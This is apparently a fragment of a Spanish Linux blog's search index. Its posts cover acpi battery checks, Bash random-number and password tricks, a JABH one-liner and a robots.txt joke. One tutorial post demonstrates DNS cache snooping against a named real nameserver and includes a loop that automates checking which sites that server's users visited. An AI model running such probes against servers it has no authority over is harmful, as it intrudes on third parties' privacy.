Remaining capacity : 887 mWh, 100.0%, 00:00:00 Design capacity : 5200 mWh Last full capacity : 887 mWh, 17.06% of design capacity Capacity loss : 82.94% Present rate : 1 mW Charging state : charged Battery type : non-recharge Model number : 0 mWh Serial number : Dell Otro comando es acpi , que hace más o menos lo mismo: ```bash $ acpi -h Usage: acpi [OPTION]... Shows information from the /proc filesystem, such as battery status or thermal information. -b, --battery battery information -i, --details show additional details if available: - battery capacity information - temperature trip points -a, --ac-adapter ac adapter information -t, --thermal thermal information -c, --cooling cooling information -V, --everything show every device, overrides above options -s, --show-empty show non-operational devices -f, --fahrenheit use fahrenheit as the temperature unit -k, --kelvin use kelvin as the temperature unit -d, --directory path to ACPI info (/sys/class resp. /proc/acpi) -p, --proc use old proc interface instead of new sys interface -h, --help display this help and exit -v, --version output version information and exit By default, acpi displays information on installed system batteries. Non-operational devices, for example empty battery slots are hidden. The default unit of temperature is degrees celsius. Report bugs to Michael Meskes . ``` bash $ acpi Battery 0: Charging, 38%, 00:28:05 until charged bash $ acpi -a Adapter 0: on-line Con acpi también podemos controlar la temperatura. bash $ acpi -t Thermal 0: ok, 58.0 degrees C Thermal 1: ok, 60.0 degrees C Thermal 2: ok, 72.0 degrees C if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2010/09/26/la-bateria-del-portatil/","loc":"https://karpoke.ignaciocano.com/2010/09/26/la-bateria-del-portatil/"},{"title":"Bash DNS Cache Snooping","text":"DNS Cache Snooping consiste en realizar una serie de peticiones de resolución de nombres de dominio a la caché de un servidor DNS, con la finalidad de conocer si los usuarios de ese servidor han visitado esos dominios. Hay que tener en cuenta que las entradas en la caché tienen un tiempo de caducidad, y si durante ese tiempo no ha habido una petición a un dominio, éste es eliminado. Para conocer qué servidores DNS hay bajo un dominio: bash $ nslookup -type=ns google.com ```bash Server: 192.168.1.1 Address: 192.168.1.1#53 Non-authoritative answer: google.com nameserver = ns2.google.com. google.com nameserver = ns1.google.com. google.com nameserver = ns4.google.com. google.com nameserver = ns3.google.com. Authoritative answers can be found from: ns4.google.com internet address = 216.239.38.10 ns1.google.com internet address = 216.239.32.10 ns3.google.com internet address = 216.239.36.10 ns2.google.com internet address = 216.239.34.10 ``` Del resultado, nos interesará los que vienen identificados como nameserver , por ejemplo, ns1.google.com . Para saber si algún usuario que realiza las peticiones de resolución de nombres a este DNS ha visitado una página concreta, por ejemplo yahoo.com : bash $ nslookup -type=a -norecurse yahoo.com ns1.google.com ```bash Server: ns3.google.com Address: 216.239.36.10#53 ** server can't find yahoo.es: REFUSED ``` En este caso, Google bloquea este tipo de peticiones. Probemos con el servidor DNS de otro dominio: bash $ nslookup -type=a -norecurse yahoo.com ns1.renfe.es ```bash Server: ns1.renfe.es Address: 213.144.33.254#53 Non-authoritative answer: * Can't find yahoo.com: No answer ``` Este servidor sí ha respondido: nadie ha visitado yahoo.com , al menos en el tiempo de caducidad de una entrada en la caché del servidor DNS. Hacemos una prueba más: bash $ nslookup -type=a -norecurse google.com ns1.renfe.es ```bash Server: ns1.renfe.es Address: 213.144.33.254#53 Non-authoritative answer: Name: google.com Address: 74.125.39.106 Name: google.com Address: 74.125.39.147 Name: google.com Address: 74.125.39.99 Name: google.com Address: 74.125.39.103 Name: google.com Address: 74.125.39.104 Name: google.com Address: 74.125.39.105 ``` Ahora sí, vemos que google.com sí ha sido visitado. Vamos a automatizar el proceso de comprobación de cada página en el script dns-cache-snooping.sh . Primero, supongamos que tenemos un fichero con una lista de páginas a comprobar. La metemos en una lista: ```bash $ urls=() $ f=\"sites.txt\" $ if [ -r $f ]; then while read line; do urls+=( $line ) done > \"$f\" fi ``` Recorrermos la lista realizando las peticiones y mostrando el resultado en verde o rojo, según si ha sido encontrada la página en la caché o no: ```bash $ ns=ns1.renfe.es $ for url in ${urls[*]}; do if [ -n \"$(nslookup -type=a -norecurse $url $ns | grep 'Name:')\" ]; then echo $url fi done ``` Inspirado en un artículo de El maligno Más información: DNS Cache Snooping","tags":"hack","url":"https://karpoke.ignaciocano.com/2010/09/25/bash-dns-cache-snooping/","loc":"https://karpoke.ignaciocano.com/2010/09/25/bash-dns-cache-snooping/"},{"title":"Random Bash","text":"\"Los números aleatorios no deberían ser generados por un método elegido aleatoriamente\". Donald E. Knuth En Bash, podemos obtener números enteros aleatorios : bash $ echo $RANDOM 20684 Cada vez que se referencia el parámetro RANDOM , éste devuelve un valor entre 0 y 32767, es decir, 2&#94;15&#94;-1. Podemos inicializar la secuencia de números aleatorios asignando un valor a RANDOM. Debemos tener en cuenta que si le asignamos un valor vacío a RANDOM se pierden sus propiedades especiales, aunque después lo inicialicemos. Podemos poner a prueba la calidad de esos números aleatorios: ```bash $ a=() $ freq=10 $ max=327680 $ for ((i=0; i < $max; i++)); do # progress bar test \\(((i%(\\) max/ \\(freq))) -eq 0 && echo -n \".\" j=\\) RANDOM a[ \\(j]=\\) ((a[ \\(j]+1)) done $ for ((i=0; i < $max/\\) freq; i++)); do echo \" \\(i: ${a[\\) i]}\"; done | less ``` Más números Podemos obtener el módulo aleatorio de un número aleatorio. bash $ echo $((RANDOM%RANDOM)) 4530 ¿Afectará de alguna manera realizar el módulo aleatorio sobre un número aleatorio como variable aleatoria? Sí, ya que en el mejor caso, el módulo será mayor que el primer número y, por lo tanto, no afecta al resultado. Pero en el peor caso, el módulo será menor que el primer número, con lo que es mayor la probabilidad de obtener un número menor. ```bash $ a=() $ freq=10 $ max=327680 $ for ((i=0; i < $max; i++)); do # progress bar test \\(((i%(\\) max/ \\(freq))) -eq 0 && echo -n \".\" j=\\) ((RANDOM%RANDOM)) a[ \\(j]=\\) ((a[ \\(j]+1)) done $ for ((i=0; i < $max/\\) freq; i++)); do echo \" \\(i: ${a[\\) i]}\"; done ``` Números aleatorios binarios, octales y hexadecimales: bash $ b=2 $ for ((i=0; i < RANDOM%RANDOM; i=i+RANDOM%b)); do echo -n $((i%b)); done 000010001111101001010001111101001011111 $ b=8 $ for ((i=0; i < RANDOM%RANDOM; i=i+RANDOM%b)); do echo -n $((i%b)); done 04743654506265435353610222054150 $ a=\"01234566789ABCDEF\" $ for ((i=0; i < RANDOM%RANDOM; i++ )); do echo -n ${a:$RANDOM%${#a}:1}; done 0150633894AD8DEF81671B06694C6B5 Debemos tener en cuenta que si queremos utilizar estos números, el prefijo, en Bash, para los números binarios es 2# , para los números octales es 0 y para los números hexadecimales, 0x . Por ejemplo, el número 10 es 2#1010 , 012 y 0x10 . Y letras Podemos crear una secuencia de números y letras aleatoria: bash $ a=$(echo $((echo -n {a..z}; echo -n {A..Z}; echo -n {0..9};) | sed 's/ //g')) $ for ((i=0; i < RANDOM%RANDOM; i++)); do echo -n ${a:$RANDOM%${#a}:1}; done 3keV1cLFGdxO2S5nvJGzoq9EyZeryLjkVgP64Dn0z Fuentes de aleatoriedad /dev/random /dev/urandom /proc/interrupts Los dos primeros son ficheros especiales que permiten acceso al generador de números aleatorios del kernel. El kernel recoge ruido ambiental desde los controladores de dispositivos (como por ejemplo, el ratón) y otras fuentes y lo usa como fuente de aleatoriedad. También tiene en cuenta el número de bits que se pueden crear aleatoriamente con un nivel de entropía tal que no sean vulnerables a ataques criptográficos. /dev/random se debería utilizar para crear claves criptográficas, para todo lo demás, podemos usar /dev/urandom . Estas fuentes proporcionan bits aleatorios, no caracteres, por lo que antes de utilizarlos para mostrar una cadena de caracteres deberemos pasarlos por alguna función como: md5sum shasum sha1sum sha224sum sha256sum sha384sum sha512sum grep -o '[[:alnum:]]' tr -dc a-zA-Z0-9 xxd -ps od -An -td | sed 's/\\s_\\(._\\)\\s/\\1/g' o cualquier otra combinación que filtre los caracteres /proc/interrupts registra el número de interrupciones de cada dispotivo de entrada/salida, por lo que debería funcionar bien como fuente de aleatoriedad. Cadenas de caracteres aleatorios: bash $ strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 12 | tr -d '\\n'; echo tUqWq9fqem9C1gKbTpCcVJg6DNvxMG $ < /dev/urandom tr -dc _a-zA-Z0-9 | head -c12 1G0gNNXM3RkT $ dd if=/dev/random bs=1 count=5 2>/dev/null | xxd -ps 3e3206ff95 Generando entropía Si la fuente de entropía no da abasto y necesitamos generar más entropía más rápido, por ejemplo, cuando creamos claves RSA muy largas, poner a trabajar el equipo podría servir. Algo como: bash $ ls -lRh / $ find / -name \\* Sin embargo, existe un programa que sirve para esto. rng-tools ayuda a generar entropía . Una vez instalado desde los respositorios, modificamos el fichero /etc/default/rng-tools para que contenga: bash HRNGDEVICE=/dev/urandom Y reiniciamos el servicio: bash $ sudo service rng-tools restart Si ahora volvemos a crear una clave, notaremos que el tiempo necesario para conseguir la entropía necesaria es mucho menor. Actualizado el 25 de septiembre de 2016 Otro servicio que sirve para esto es haveged : bash systemctl enable haveged systemctl start haveged Otros programas Podemos instalar estos programas desde los repositorios. makepasswd Para crear contraseñas. bash $ makepasswd --char=12 mkpasswd Otro para crear contraseñas. bash $ mkpasswd openssl Permite obtener una serie de bytes hexadecimales aleatorios; por cada byte hexadecimal se imprimen dos caracteres hexadecimales: bash $ openssl rand -hex 16 5666b2215534c6d4c3be4101219cd0b1 También permite obtener caracteres en base64: bash $ openssl rand -base64 12 ymwU0wtOZ6wMgAfr pwgen Otro más para crear contraseñas bash $ pwgen 12 rand Trabaja con números y caracteres. Por ejemplo, podemos obtener números decimales aleatorios. bash $ rand -f 0.04691 No sólo letras y números Podemos crear una dirección MAC aleatoria: bash $ echo $(cat /proc/interrupts | md5sum | sed -r 's/&#94;(.{10}).*$/00\\1/; s/([0-9a-f]{2})/\\1:/g; s/:$//;') 00:6d:b6:2f:46:1d $ openssl rand -hex 6 | sed -r 's/&#94;(.{10}).*$/00\\1/; s/([0-9a-f]{2})/\\1:/g; s/:$//;' 00:8d:e6:98:ca:d2 Podemos crear un fichero o un directorio temporal, cuyo nombre es aleatorio: bash $ mktemp /tmp/tmp.WBABktXDHZ $ mktemp -d /tmp/tmp.lHuPARC0YC Podemos mostrar un fichero aleatorio: bash $ find ~ -maxdepth 1 | shuf -n1 --random-source=/dev/random ./bash_aliases Podemos poner una imagen de fondo de escritorio aleatoria en Gnome: bash $ f=$(find ~/Imágenes/ | shuf -n1 | egrep 'gif|jpe?g|png') $ while test -n \"$f\"; do f=$(find ~/Imágenes/ | shuf -n1); done $ gconftool-2 -t str --set /desktop/gnome/background/picture_filename \"$f\" Podemos generar una contraseña a partir de 4 palabras aleatorias : bash $ printf '%s %s %s %s' $(\\grep -v \"'\" /usr/share/dict/american-english | shuf -n 4 | tr '[:upper:]' '[:lower:]') meters haven backtracking subordinates Podemos mostrar una línea aleatoria de un fichero: bash $ shuf -n1 /etc/passwd O también podemos mostrar un número de líneas aleatorio de un archivo aleatorio del código fuente de Linux: ```bash \\( f=\\) (find /usr/src/linux-source-2.6.32 -type f -name * | shuf -n1) \\( n=\\) (wc -l \\(f | awk '{print $1}') $ cat $f | sed -n $((RANDOM%n)),\\) ((RANDOM%n))p if (!zalloc_cpumask_var(&vec->mask, gfp)) goto cleanup; } for_each_possible_cpu(i) cp->cpu_to_pri[i] = CPUPRI_INVALID; return 0; cleanup: for (i--; i >= 0; i--) free_cpumask_var(cp->pri_to_cpu[i].mask); return -ENOMEM; } ``` Internet En Internet, hay servicios cuyas respuestas aleatorias podemos utilizar en nuestra vida cotidiana: Obtener una excusa de BOFH aleatoria: ```bash $ telnet towel.blinkenlights.nl 666 === The BOFH Excuse Server === We didn't pay the Internet bill and it's been cut off. ``` Obtener un hecho aleatorio: bash $ curl -s http://randomfunfacts.com | grep -Eo \".*\" | sed -r 's/([&#94;< ]+)<\\/i>< \\/strong>/\\1/' Donkeys kill more people annually than plane crashes. Obtener un mensaje aleatorio para un commit : bash $ curl -s http://whatthecommit.com | grep \"\" | sed -r 's/([&#94;$]+)$/\\1/' Fucking egotistical bastard. adds expandtab to vimrc Obtener una frase de Futurama aleatoria desde Slashdot: bash $ curl -Is slashdot.org | sed -n '5p' | sed 's/&#94;X-//' Bender: I'm one of those lazy, homeless bums I've been hearing about. Obtener una excusa de programador aleatoria: bash curl -s https://api.githunt.io/programmingexcuses Además de números y letras, también podemos obtener números de lotería, imágenes, secuencias, fechas, horas, coordenadas geográficas, música, testimonios... todo aleatorio en random.org bash $ curl -s \"https://www.random.org/passwords/?num=1&len=8&format=html&rnd=new\" Imágenes: xkcd , dilbert Comandos relacionados con la aleatoriedad en commandlinefu if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"dev","url":"https://karpoke.ignaciocano.com/2010/09/25/random-bash/","loc":"https://karpoke.ignaciocano.com/2010/09/25/random-bash/"},{"title":"JABH - Just Another Bash Hacker","text":"Se le llama JAPH a un programa en Perl que escribe \"Just another Perl hacker,\". JABH vendría a ser algo parecido, en Bash: bash $ s=\"Jaescunrhkso ettBhr haa,\";for y in {0..4};do for x in {0..4};do echo -n \"${s:$((5*x+y)):1}\";done;done Just another Bash hacker, Otra versión, algo más críptica: bash $ s=\"Jaescunrhkso ettBhr haa,\";t=4;f(){ eval \"for $1 in {0..$t};do eval $2;done;\";};f x ';f y \"echo -n \\\"'\\''\\${s:\\$(((t+1)*y+x)):1}'\\''\\\"\"' Just another Bash hacker, \"JAPH\"","tags":"dev","url":"https://karpoke.ignaciocano.com/2010/07/28/jabh/","loc":"https://karpoke.ignaciocano.com/2010/07/28/jabh/"},{"title":"Antes de que los robots dominaran el planeta","text":"Si Skynet no tomó conciencia de sí mismo el 29 de agosto de 1997, seguro que fue gracias a que existen desarrolladores precavidos, como los de last.fm , que añaden al robots.txt las siguientes líneas: bash Disallow: /harming/humans Disallow: /ignoring/human/orders Disallow: /harm/to/self » barrapunto \"Skynet\" \"last.fm\"","tags":"memo","url":"https://karpoke.ignaciocano.com/2010/07/28/antes-de-que-los-robots-dominaran-el-planeta/","loc":"https://karpoke.ignaciocano.com/2010/07/28/antes-de-que-los-robots-dominaran-el-planeta/"}]};